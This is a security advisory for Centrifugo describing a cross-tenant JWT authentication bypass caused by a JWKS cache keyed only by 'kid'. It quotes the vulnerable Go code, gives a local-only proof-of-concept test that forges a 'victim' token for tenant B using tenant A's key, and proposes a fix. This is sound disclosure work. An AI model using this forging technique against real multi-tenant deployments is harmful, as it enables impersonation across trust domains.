# [H] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass

## Summary
Severity: High
Advisory: GHSA-g6vg-wj8f-48cj
CVE: CVE-2026-49998
CWE: CWE-347
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-g6vg-wj8f-48cj
Type: github-advisory

## Affected
- Go: `github.com/centrifugal/centrifugo/v6` — affected >=0 <6.8.1
- Go: `github.com/centrifugal/centrifugo/v5` — affected >=0
- Go: `github.com/centrifugal/centrifugo/v4` — affected >=0
- Go: `github.com/centrifugal/centrifugo/v3` — affected >=0
- Go: `github.com/centrifugal/centrifugo` — affected >=0

## Details
#### Summary

Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and `singleflight` lookup are keyed only by the JWT header `kid`, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.

In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same `kid` value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.

#### Details

The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT `iss` or `aud` claims:

- `client.token.jwks_public_endpoint`
- `client.subscription_token.jwks_public_endpoint`

Relevant shipped config fields are defined in `internal/configtypes/types.go:59-65`, mapped into verifier configuration in `internal/confighelpers/jwt.go:36-41`, and exposed in the generated config schema at `internal/cli/configdoc/schema.json:3927`, `3947`, `3967`, `3987`, `4069`, `4089`, `4109`, and `4129`. Dynamic JWKS endpoints based on `iss` and `aud` are documented in the project changelog at `CHANGELOG.md:107`.

External clients control JWT connection and subscription tokens:

- Connection tokens reach `VerifyConnectToken` from `internal/client/handler.go:350-352`.
- Normal subscription tokens reach `VerifySubscribeToken` from `internal/client/handler.go:769-775`.
- Subscription refresh tokens reach `VerifySubscribeToken` from `internal/client/handler.go:628-632`.

The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:

- `VerifyConnectToken` parses without verification at `internal/jwtverify/token_verifier_jwt.go:528-535`, extracts template variables before signature verification at `internal/jwtverify/token_verifier_jwt.go:539-548`, then validates claims only after signature verification at `internal/jwtverify/token_verifier_jwt.go:557-560`.
- `VerifySubscribeToken` follows the same pattern at `internal/jwtverify/token_verifier_jwt.go:700-732`.

The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. `internal/jwtverify/token_verifier_jwt.go:242-245` passes only the JWT header `kid` plus token-derived variables to the JWKS manager:

```go
func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
    kid := token.Header().KeyID

    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
```

`internal/jwks/manager.go:96-117` checks cache and `singleflight` using only `kid`:

```go
func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
    if kid == "" {
        return nil, ErrKeyIDNotProvided
    }

    if m.useCache {
        key, err := m.cache.Get(kid)
        if err == nil {
            return key, nil
        }
    }

    v, err, _ := m.group.Do(kid, func() (any, error) {
        return m.fetchKey(ctx, kid, tokenVars)
    })
```

The resolved JWKS URL is computed only later in `internal/jwks/manager.go:133-149`:

```go
func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
    jwkURL := m.url.ExecuteString(tokenVars)
    ...
    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
```

The TTL cache also stores and retrieves keys only by `kid` at `internal/jwks/cache_ttl.go:82-101`:

```go
func (tc *TTLCache) Add(key *JWK) error {
    ...
    tc.items[key.Kid] = item
}

func (tc *TTLCache) Get(kid string) (*JWK, error) {
    ...
    item, ok := tc.items[kid]
```

As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.

I also reviewed the template safety mitigation in `internal/jwtverify/validate.go:99-154`. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: `^(?P<tenant>tenant-a|tenant-b)$`.

#### PoC

This is a safe local-only unit test using `httptest.Server` and generated RSA key pairs. It does not contact external systems.

From a clean checkout of `centrifugal/centrifugo` at commit `458ee0500f046877d7e8375e32f5e842bc95535b`, add this file as `internal/jwtverify/jwks_cache_poc_test.go`:

```go
package jwtverify

import (
    "crypto/rsa"
    "encoding/json"
    "net/http"
    "net/http/httptest"
    "sync/atomic"
    "testing"
    "time"

    "github.com/centrifugal/centrifugo/v6/internal/config"

    "github.com/cristalhq/jwt/v5"
    "github.com/stretchr/testify/require"
)

func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
    t.Helper()
    resp := map[string]any{
        "keys": []map[string]string{
            {
                "alg": "RS256",
                "kty": "RSA",
                "use": "sig",
                "kid": kid,
                "n":   encodeToString(pubKey.N.Bytes()),
                "e":   encodeUint64ToString(uint64(pubKey.E)),
            },
        },
    }
    w.Header().Set("Content-Type", "application/json")
    require.NoError(t, json.NewEncoder(w).Encode(resp))
}

func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
    t.Helper()
    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
    require.NoError(t, err)
    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
    claims := &ConnectTokenClaims{
        Base64Info: "e30=",
        RegisteredClaims: jwt.RegisteredClaims{
            Subject:   user,
            Issuer:    issuer,
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
        },
    }
    token, err := builder.Build(claims)
    require.NoError(t, err)
    return token.String()
}

func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
    const kid = "shared-kid"

    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)

    var tenantARequests int32
    var tenantBRequests int32

    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        switch r.URL.Path {
        case "/tenant-a/jwks.json":
            atomic.AddInt32(&tenantARequests, 1)
            writeRSAJWKS(t, w, tenantAPublicKey, kid)
        case "/tenant-b/jwks.json":
            atomic.AddInt32(&tenantBRequests, 1)
            writeRSAJWKS(t, w, tenantBPublicKey, kid)
        default:
            http.NotFound(w, r)
        }
    }))
    defer ts.Close()

    cfg := config.DefaultConfig()
    cfgContainer, err := config.NewContainer(cfg)
    require.NoError(t, err)

    newVerifier := func() *VerifierJWT {
        verifier, err := NewTokenVerifierJWT(VerifierConfig{
            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
            IssuerRegex:        `^(?P<tenant>tenant-a|tenant-b)$`,
        }, cfgContainer)
        require.NoError(t, err)
        return verifier
    }

    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)

    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
    require.NoError(t, err)
    require.Equal(t, "tenant-b-user", ct.UserID)

    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
    require.Error(t, err)

    verifier := newVerifier()
    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
    require.NoError(t, err)
    require.Equal(t, "tenant-a-user", ct.UserID)

    tenantBRequestsBeforeForge := atomic.LoadInt32(&tenantBRequests)
    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
    require.NoError(t, err)
    require.Equal(t, "victim", ct.UserID)
    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&tenantBRequests))
}
```

Run the focused test with the project-supported Go toolchain:

```bash
go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
```

Observed vulnerable output in my local test environment using Go 1.26.3:

```text
=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
PASS
ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
```

The passing test demonstrates the vulnerable behavior because it asserts these controls:

1. A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.
2. A forged tenant-B token signed by tenant A fails with a fresh verifier.
3. A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's `shared-kid` key.
4. The forged tenant-B token signed by tenant A then succeeds with user ID `victim`.
5. The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.

Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.

#### Impact

This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.

Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using `{{tenant}}` values extracted from `iss` or `aud`.

An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same `kid` value and the attacker's issuer key is cached first. `kid` values are not globally unique by specification and are often operational labels such as `current`, `default`, or rotation identifiers, so the verifier should not rely on `kid` uniqueness across different JWKS trust domains.

Potential consequences include:

- Authentication as a user in another issuer/tenant namespace.
- Unauthorized connection-token acceptance.
- Unauthorized subscription-token acceptance where separate subscription JWTs are configured.
- Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.

#### Suggested remediation

Scope JWKS cache entries and `singleflight` keys to the resolved JWKS trust domain, not only to the JWT `kid`.

For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:

```text
resolved_jwks_url + "\x00" + kid
```

or an equivalent canonical trust-domain identifier plus `kid`.

The same composite namespace should be used for:

- TTL cache lookup.
- TTL cache storage.
- `singleflight.Group.Do` keys.

A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.

## References
- https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj
- https://github.com/centrifugal/centrifugo
